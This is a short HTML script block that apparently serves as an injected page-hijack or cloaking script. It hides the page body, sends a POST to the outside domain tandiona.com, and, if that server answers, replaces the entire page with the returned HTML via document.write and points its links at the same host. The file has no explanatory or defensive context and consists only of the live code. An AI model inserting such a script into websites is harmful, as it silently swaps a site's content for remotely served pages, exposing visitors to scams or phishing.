<script>
style = document.createElement('style');
style.innerText = 'body{display:none;}';
document.head.appendChild(style);

var url = new URL('https://tandiona.com/xn1rBtwT?type=landing');
var xhr = new XMLHttpRequest();

xhr.withCredentials = false;
xhr.open("POST", url, true);
xhr.send();

xhr.onload = function() {
    if (xhr.status === 200) {
        if(xhr.responseText) {

            var lander  = xhr.responseText.replace('href\=\"\/pages\/', 'href="https://tandiona.com/pages/');
          
            document.open();
            document.write(lander);
            document.close();
            return;
        } else {
            style.remove()
        }

    } else {
        style.remove()
    }
};
</script>
